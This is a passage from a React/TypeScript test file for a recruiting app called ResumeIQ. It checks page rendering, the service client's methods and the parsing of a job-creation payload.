      expect(html).toContain('Create Job Requisition');
      expect(html).toContain('Search by job title, company, skill, or location...');
    });

    it('T5.7.6: renders JobCandidates screening page with match score indicators', () => {
      const html = renderToString(
        <MemoryRouter initialEntries={['/jobs/1/candidates']}>
          <Routes>
            <Route path="/jobs/:jobId/candidates" element={<JobCandidates />} />
          </Routes>
        </MemoryRouter>
      );

      expect(html).toBeDefined();
      expect(html.length).toBeGreaterThan(100);
    });

    it('T5.7.7: renders LayoutShell with Sidebar, Topbar, and Ambient Glow mesh', () => {
      const html = renderToString(
        <MemoryRouter initialEntries={['/']}>
          <LayoutShell>
            <div data-testid="main-content">Content Body</div>
          </LayoutShell>
        </MemoryRouter>
      );

      expect(html).toContain('ResumeIQ');
      expect(html).toContain('Dashboard');
      expect(html).toContain('Upload');
      expect(html).toContain('Candidates');
      expect(html).toContain('Jobs');
      expect(html).toContain('Content Body');
      expect(html).toContain('AI Engine');
    });
  });

  // =========================================================================
  // 8. Service Client & API Interception Robustness
  // =========================================================================
  describe('8. API Service Client & Request Factory Robustness', () => {

    it('T5.8.1: verifies CandidateService methods construct correct HTTP routes', () => {
      expect(typeof CandidateService.getCandidates).toBe('function');
      expect(typeof CandidateService.getCandidateById).toBe('function');
      expect(typeof CandidateService.deleteCandidate).toBe('function');
    });

    it('T5.8.2: verifies JobService methods construct correct HTTP routes', () => {
      expect(typeof JobService.getJobs).toBe('function');
      expect(typeof JobService.getJobById).toBe('function');
      expect(typeof JobService.createJob).toBe('function');
      expect(typeof JobService.deleteJob).toBe('function');
      expect(typeof JobService.getRankedCandidates).toBe('function');
    });

    it('T5.8.3: verifies ResumeService, DashboardService, and HealthService methods', () => {
      expect(typeof ResumeService.uploadResume).toBe('function');
      expect(typeof ResumeService.getResumeById).toBe('function');
      expect(typeof DashboardService.getStats).toBe('function');
      expect(typeof HealthService.checkHealth).toBe('function');
    });

    it('T5.8.4: validates JobCreatePayload schema constraints', () => {
      const payload: JobCreatePayload = {
        title: 'Lead Architect',
        company: 'ResumeIQ',
        description: 'Building AI matching platform',
        required_skills: 'React, TypeScript',
        preferred_skills: 'AWS, Docker',
        minimum_experience_years: 5,
        education_requirement: 'B.S. in Computer Science',
        location: 'San Francisco, CA',
      };

      expect(payload.title).toBe('Lead Architect');
      expect(payload.minimum_experience_years).toBe(5);
      expect(parseSkillList(payload.required_skills)).toEqual(['React', 'TypeScript']);
      expect(parseSkillList(payload.preferred_skills)).toEqual(['AWS', 'Docker']);
    });
  });
});
